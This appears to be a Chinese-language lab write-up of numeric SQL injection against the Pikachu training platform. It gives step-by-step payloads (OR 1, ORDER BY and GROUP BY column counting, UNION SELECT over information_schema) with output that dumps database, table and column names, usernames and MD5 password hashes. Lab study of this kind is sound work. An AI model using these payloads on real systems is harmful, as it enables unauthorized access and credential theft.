

### 猜後端大概是這樣的語句
```
select * from table where userid= 1 ;
```

### 可以查到東西，確定為數字型
```
1
```

### 加上單雙引號都查不到
```
1'
1"
```



---




`1 or 1`

可以爆出所有使用者，和email


```
 <p class='notice'>hello,vince <br />your email is: 1111111111111 </p>
 <p class='notice'>hello,allen <br />your email is: allen@pikachu.com </p>
 <p class='notice'>hello,kobe <br />your email is: kobe@pikachu.com </p>
 <p class='notice'>hello,grady <br />your email is: grady@pikachu.com </p>
 <p class='notice'>hello,kevin <br />your email is: kevin@pikachu.com </p>
 <p class='notice'>hello,lucy <br />your email is: lucy@pikachu.com </p>
 <p class='notice'>hello,lili <br />your email is: lili@pikachu.com </p>
 <p class='notice'>hello,123 <br />your email is: </p>
 <p class='notice'>hello,123 <br />your email is: </p>
 <p class='notice'>hello,456 <br />your email is: </p>
 <p class='notice'>hello,123 <br />your email is: </p>
 <p class='notice'>hello,11111111 <br />your email is: 11111111 </p>
 <p class='notice'>hello,22222222 <br />your email is: 2222222222 </p>
 <p class='notice'>hello,1111 <br />your email is: 111111 </p>
 <p class='notice'>hello,123 <br />your email is: 111111 </p>
 <p class='notice'>hello,456 <br />your email is: 111111 </p>
 <p class='notice'>hello,1111 <br />your email is: 111111 </p>
 <p class='notice'>hello,77777 <br />your email is: 111111 </p>
```


### code:

此語句只有兩個欄位 username, email
```
$query="select username,email from member where id=$id";
```

以下驗證查詢列數是否為2，方法有很多種

---
### 基於錯誤檢測出欄位數量
```
1 ORDER BY 1--+ 正確輸出
1 ORDER BY 2--+ 正確輸出
1 ORDER BY 3--+ 不正確輸出


1 GROUP BY 1--+ 正確輸出
1 GROUP BY 2--+ 正確輸出
1 GROUP BY 3--+ 不正確輸出
```


```
1 ORDER BY 1 --+ 正確輸出
1 ORDER BY 1,2 --+ 正確輸出 
1 ORDER BY 1,2,3 --+ 不正確輸出


1 GROUP BY 1 --+ 正確輸出
1 GROUP BY 1,2 --+ 正確輸出
1 GROUP BY 1,2,3 --+ 錯誤輸出
```

---



### union 查詢，也要符合前面語句相同欄位數

```
1 UNION SELECT @--+ 錯誤輸出

1 UNION SELECT @,@--+ 正確輸出

1 UNION SELECT @,@,@--+ 錯誤輸出
```

---

### 所以我們最多只能一次查找兩個欄位。


* 5.0 以上 有information_schema 
* 第一個欄位放 @ 
* 第二個則是 gRoUp_cOncaT(....)


---

```
1 UNION SELECT @, gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata #

爆出mysql 中所有的db
|information_schema|,|a_com__phpcmsv9|,|dvwa|,|my_db|,|mysql|,|performance_schema|,|phpcmsv9|,|phpcmsv9123123|,|pikachu|,|sys|,|test002|,|wp1|

```




```
1 UniOn Select @,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema='pikachu' #

爆出pikachu DB的所有表
|httpinfo|,|member|,|message|,|users|,|xssblind|
```









```
1 UniOn Select @,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name='member' #


爆出pikachu member表所有欄位

|id|,|username|,|pw|,|sex|,|phonenum|,|address|,|email|
```





```


1 UniOn Select @,gRoUp_cOncaT(0x7c,pw,0x7C)+fRoM+member #

member 表下的 pw 欄位所有資料

有爆出pw 但沒爆出所有的(我猜是後端有長度限制)，可以加上limit 去調
|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|e10adc3949ba59abbe56e057f20f883e|,|202cb962ac59075b964b07152d234b70|,|202cb962ac59075b964b07152d234b70|,|250cf8b51c773f3f8dc8b4be8
```



```

1 UniOn Select @,gRoUp_cOncaT(0x7c,username,0x7C)+fRoM+member #

username 就很完整的全爆出來

|vince|,|allen|,|kobe|,|grady|,|kevin|,|lucy|,|lili|,|123|,|123|,|456|,|123|,|11111111|,|22222222|,|1111|,|123|,|456|,|1111|,|77777|
```








